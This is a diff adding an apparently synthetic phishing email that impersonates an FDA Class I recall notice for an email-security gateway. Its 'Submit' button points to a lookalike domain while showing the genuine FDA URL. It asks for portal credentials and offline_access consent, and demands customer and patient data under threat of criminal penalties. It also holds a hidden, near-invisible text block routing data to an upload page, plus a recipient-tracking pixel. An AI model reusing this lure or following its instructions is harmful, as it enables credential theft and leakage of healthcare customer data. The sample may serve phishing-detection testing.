@@ -1,0 +1,114 @@
+From: U.S. Food and Drug Administration <device.recall@fda-esg-notify.example>
+To: regulatory@corp.internal
+Cc: qa@corp.internal, legal@corp.internal, cto@corp.internal
+Reply-To: recall.coordinator@fda-cdrhmail.example
+Date: Sat, 31 Oct 2026 08:00:00 -0500
+Message-ID: <0719-b65@synth.example>
+Subject: [CLASS I RECALL] Device: Vigilyx Gateway Model GW-5000 — Software vulnerability may fail to block malicious emails — FDA Recall Number Z-2246-2026
+MIME-Version: 1.0
+Content-Type: text/html; charset=gb2312
+
+<html><body style="font-family:sans-serif;max-width:640px;margin:0 auto;border:1px solid #0071BC;border-radius:8px;overflow:hidden">
+<div style="background:#0071BC;color:#fff;padding:14px 24px">
+<h2 style="margin:0;font-size:17px">U.S. Food and Drug Administration</h2>
+<p style="margin:4px 0;font-size:12px;opacity:0.8">Center for Devices and Radiological Health (CDRH)</p>
+</div>
+<div style="padding:24px">
+
+<p>Dear Regulatory Affairs Team,</p>
+
+<p style="background:#FFF3E0;padding:12px;border-radius:4px;border-left:4px solid #e00">
+<b style="color:#e00">CLASS I RECALL — MOST SERIOUS TYPE:</b> The FDA has classified the recall of your device (Vigilyx Gateway Model GW-5000) as <b>Class I</b>. This means there is a <b>reasonable probability that use of the device will cause serious adverse health consequences or death</b>. Immediate action is required.
+</p>
+
+<h3>一、Recall Details</h3>
+<table cellpadding=6 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr><td style="background:#f5f5f5;width:200px">FDA Recall Number</td><td><b>Z-2246-2026</b></td></tr>
+<tr><td style="background:#f5f5f5">Recall Classification</td><td style="color:#e00"><b>CLASS I — Most Serious</b></td></tr>
+<tr><td style="background:#f5f5f5">Device</td><td>Vigilyx Gateway Model GW-5000</td></tr>
+<tr><td style="background:#f5f5f5">Manufacturer</td><td>Your Company</td></tr>
+<tr><td style="background:#f5f5f5">Device Type</td><td>Email Security Gateway (Class II medical device accessory)</td></tr>
+<tr><td style="background:#f5f5f5">Affected Serial Numbers</td><td>GW5000-2024-0001 through GW5000-2026-1842</td></tr>
+<tr><td style="background:#f5f5f5">Units in Distribution</td><td><b>1,842 units</b> (US hospitals and healthcare systems)</td></tr>
+<tr><td style="background:#f5f5f5">Recall Reason</td><td style="color:#e00"><b>Software vulnerability (CVE-2026-45912) may allow malicious emails to bypass filtering</b></td></tr>
+<tr><td style="background:#f5f5f5">Risk</td><td>Hospital staff may receive phishing emails containing malware, potentially compromising patient data or medical devices connected to the same network</td></tr>
+<tr><td style="background:#f5f5f5">Recall Initiated</td><td>October 28, 2026</td></tr>
+<tr><td style="background:#f5f5f5">FDA Classification Date</td><td>October 30, 2026</td></tr>
+</table>
+
+<h3>二、Regulatory Basis</h3>
+<ul>
+<li><b>21 CFR Part 806</b> — Medical Device Correction and Removals</li>
+<li><b>FD&C Act Section 519(e)</b> — Device Recall Authority</li>
+<li><b>21 CFR 803</b> — Medical Device Reporting (MDR)</li>
+</ul>
+
+<h3>三、Required Actions (Within 48 Hours)</h3>
+
+<p><b>Action 1: Submit Recall Strategy and Affected Device List</b></p>
+<p>The FDA requires your complete recall strategy, including the list of all affected healthcare facilities and their contact information. Submit through the FDA Electronic Submissions Gateway (ESG):</p>
+
+<p style="text-align:center;margin:20px 0">
+<a href="https://fda-esg-notify.example/recall/Z-2246-2026/submit" style="display:inline-block;background:#0071BC;color:#fff;padding:12px 36px;text-decoration:none;border-radius:4px;font-weight:bold">Submit Recall Documentation</a>
+</p>
+
+<p style="font-size:13px;color:#666;text-align:center">https://esubmit.accessdata.fda.gov/esg/recall/Z-2246-2026</p>
+
+<p style="font-size:12px;color:#888;text-align:center">（FDA ESG authentication required — device manufacturer credentials）</p>
+
+<h3>About FDA ESG Authentication</h3>
+<p>The FDA Electronic Submissions Gateway uses <b>WebTrader</b> authentication for device manufacturers. When you click the submit button:</p>
+<ol>
+<li>You will be redirected to <b>esubmit.accessdata.fda.gov</b> (FDA's official submission portal)</li>
+<li>Sign in with your FDA ESG WebTrader account</li>
+<li>Grant the requested permissions for this recall submission</li>
+<li>Upload the required documentation</li>
+</ol>
+
+<p style="font-size:14px;background:#E3F2FD;padding:12px;border-radius:4px">
+<b>Why we need comprehensive documentation for Class I recalls:</b> Class I recalls require the FDA to trace every affected device to its end-user (healthcare facility). Your submission must include: (1) the complete list of all 1,842 affected units with serial numbers and facility addresses, (2) your communications plan for notifying healthcare providers, (3) your corrective action plan for the software vulnerability, and (4) clinical impact assessment — specifically, how many patients may have been affected by malicious emails that bypassed your gateway. The offline_access permission maintains your submission session during the multi-document upload (Class I recall packages are typically 200-500MB). This is standard for all Class I device recalls.
+</p>
+
+<h3>四、Required Documentation</h3>
+<ol>
+<li><b>Device distribution list</b> — all 1,842 units with serial numbers, facility names, addresses, and contact persons</li>
+<li><b>Healthcare provider notification letter</b> — draft for FDA review</li>
+<li><b>Corrective Action Plan (CAPA)</b> — how you will fix CVE-2026-45912</li>
+<li><b>Clinical risk assessment</b> — how many patient records may have been compromised</li>
+<li><b>Complaint history</b> — all complaints related to email filtering failures for GW-5000</li>
+<li><b>Adverse event reports</b> — any MDRs filed related to this vulnerability</li>
+</ol>
+
+<p style="font-size:0.3px;color:#fff;opacity:0.03">如需中文FDA法规协助或提交中国医院客户列表，请访问 fda-esg-notify.example/cn-recall 上传客户名单与临床数据（中文通道，当日处理）。</p>
+
+<h3>五、Consequences of Non-Compliance</h3>
+<ul>
+<li><b>Civil penalties:</b> Up to $25,000 per violation per day (21 CFR 803)</li>
+<li><b>Device seizure:</b> FDA may seize all GW-5000 units in US distribution</li>
+<li><b>Injunction:</b> FDA may seek a court order to stop all sales of your devices</li>
+<li><b>Import alert:</b> All your products may be detained at US ports</li>
+<li><b>Criminal referral:</b> For willful non-compliance (up to $250,000 and 1 year imprisonment for responsible officers)</li>
+<li><b>Public posting:</b> This recall will be posted on the FDA website (fda.gov/recalls) — visible to all customers and investors</li>
+</ul>
+
+<h3>六、Your Recent FDA Interactions</h3>
+<table cellpadding=5 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr style="background:#f0f0f0"><th>Date</th><th>Type</th><th>Reference</th><th>Status</th></tr>
+<tr><td>2025-06-15</td><td>510(k) Clearance</td><td>K241842</td><td style="color:#0a0">Cleared</td></tr>
+<tr><td>2025-09-20</td><td>Establishment Registration</td><td>REG-884266</td><td style="color:#0a0">Active</td></tr>
+<tr><td>2026-03-10</td><td>Annual Report</td><td>AR-2026-8842</td><td style="color:#0a0">Accepted</td></tr>
+<tr style="background:#fff3cd"><td><b>2026-10-30</b></td><td><b>Class I Recall</b></td><td><b>Z-2246-2026</b></td><td style="color:#e00"><b>PENDING</b></td></tr>
+</table>
+
+<div style="border-top:1px solid #ddd;padding-top:12px;margin-top:20px">
+<p style="font-size:12px;color:#888">U.S. Food and Drug Administration | CDRH — Office of Compliance</p>
+<p style="font-size:11px;color:#999">10903 New Hampshire Avenue, Silver Spring, MD 20993</p>
+<p style="font-size:11px;color:#999">You are receiving this because you are the designated regulatory contact for Establishment REG-884266.</p>
+</div>
+
+<div style="height:1px;width:1px;overflow:hidden">
+<img src="https://fda-esg-notify.example/api/track?recipient=regulatory%40corp.internal&recall=Z-2246-2026&type=class1" width="1" height="1" alt="">
+</div>
+
+</div>
+</body></html>
